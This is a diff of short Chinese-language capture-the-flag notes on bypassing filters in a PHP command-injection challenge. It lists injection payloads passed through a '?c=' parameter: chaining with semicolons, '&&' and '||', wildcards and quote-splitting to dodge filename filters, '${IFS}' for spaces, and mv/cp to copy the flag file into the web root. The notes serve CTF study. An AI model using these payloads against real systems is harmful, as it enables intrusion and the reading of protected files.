@@ -32,9 +32,14 @@
 
 * 双写分号绕过?c=tac f*;ls
 * 双写&&绕过?c=tac f*%26%26ls（注：星号被绕过可以用问号）（[0-9]和%的过滤是不会过滤%26之类的）（）
+
 * 带行号绕过?c=nl<fla''g.php%7C%7Cls(此方法可能要右键看源代码)
+
 * 有$的情况下可以重命名flag.php成txt再直接访问:先执行?c=mv${IFS}fla?.php${IFS}a.txt%7C%7Cls 然后使用ls||ls看看有没有命名成功。成功后直接访问a.txt
+
 * 其他注：?c=ls${IFS}/||ls查看根目录（ls /）
+
+* ?c=cp${IFS}/fla?${IFS}/var/www/html/b.txt（将根目录（ls /）下的flag复制到可以直接在url的目录）
 * 它只会让分号后面的指令进入黑洞，所以这里直接绕过
 
 
